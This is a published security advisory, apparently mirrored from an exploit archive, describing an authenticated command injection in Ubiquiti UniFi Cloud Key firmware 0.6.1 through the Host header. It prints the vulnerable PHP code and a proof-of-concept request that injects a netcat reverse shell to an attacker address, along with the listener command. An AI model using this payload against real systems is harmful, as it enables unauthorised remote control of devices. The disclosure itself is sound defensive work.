@@ -1,0 +1,119 @@
+id: 28243
+date: 08/05/2017
+title: Ubiquiti Networks UniFi Cloud Key Firmware 0.6.1 Command Injection Vulnerability
+author: Tim Weber
+cves: 
+
+=======================================================================
+              title: Authenticated Command Injection
+            product: Ubiquiti Networks UniFi Cloud Key
+ vulnerable version: Firmware v0.6.1
+      fixed version: Firmware v0.6.4
+         CVE number:
+             impact: High
+           homepage: https://www.ubnt.com
+              found: 2017-03-26
+                 by: T. Weber (Office Vienna)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal - Moscow
+                     Kuala Lumpur - Singapore - Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+"Ubiquiti Networks develops high-performance networking
+technology for service providers and enterprises. Our technology
+platforms focus on delivering highly advanced and easily deployable
+solutions that appeal to a global customer base in underserved and
+underpenetrated markets."
+
+Source: http://ir.ubnt.com/
+
+
+Business recommendation:
+------------------------
+SEC Consult recommends not to use this device in production until a thorough
+security review has been performed by security professionals and all
+identified issues have been resolved.
+
+
+Vulnerability overview/description:
+-----------------------------------
+A command injection can be triggered via the hostname header in the status GET
+request. This vulnerability can be exploited when the Cloud Key web interface
+is exposed to the Internet and an attacker has credentials to it.
+
+Proof of concept:
+-----------------
+The following PHP snipplet is responsible for the command execution vulnerability:
+
+(api.inc, line 265)
+-------------------------------------------------------------------------------
+[...]
+function is_unifi_running() {
+    if (!isset($_SERVER['HTTP_HOST'])) {
+            $c_host = $_SERVER['SERVER_ADDR'];
+    } else {
+            $c_host = $_SERVER['HTTP_HOST'];
+    }
+    $unifi_href = 'http://' . $c_host . ':8080/status';
+    exec(CMD_CURL . $unifi_href, $out, $rc);
+    if ($rc == 0) {
+        return true;
+    }
+    return false;
+}
+[...]
+-------------------------------------------------------------------------------
+
+Since '$c_host' is not filtered, a command injection is possible.
+
+The following GET request was used to open a reverse-shell via command injection
+from the Cloud Key system (192.168.0.30) to the attacker (192.168.0.3):
+-------------------------------------------------------------------------------
+GET /api/status HTTP/1.1
+Host: 192.168.0.30;busybox nc 192.168.0.3 8999 -e bash;
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+X-Access-Token: <Token>
+Referer: https://192.168.0.30/login
+Cookie: CKSESSIONID=<Session-ID>
+Connection: close
+-------------------------------------------------------------------------------
+
+As the listener, netcat was used:
+$ nc -lvp 8999
+
+Vulnerable / tested versions:
+-----------------------------
+Ubiquiti Networks UniFi Cloud Key version 0.6.1 has been tested. This version
+was the latest at the time the security vulnerabilities were discovered.
+
+
+Vendor contact timeline:
+------------------------
+2017-03-29: Contacting vendor via HackerOne. Vendor sets status to
+            "Triaged".
+2017-04-24: Asking for a status update; No answer.
+2017-05-06: Found update 0.6.4 on the website of the vendor.
+2017-05-15: Contacted vendor via e-mail and asked for status.
+2017-05-16: Vendor closed the ticked and changed the status to resolved.
+            Current firmware version was v0.6.4. Set the publication
+            date to 2017-08-04 (at least 90 days after fix).
+2017-08-04: Public release of security advisory
+
+Solution:
+---------
+Upgrade to v0.6.4 or above.
+
+
+Workaround:
+-----------
+None
+
+#  0day.today [2023-03-24]  #
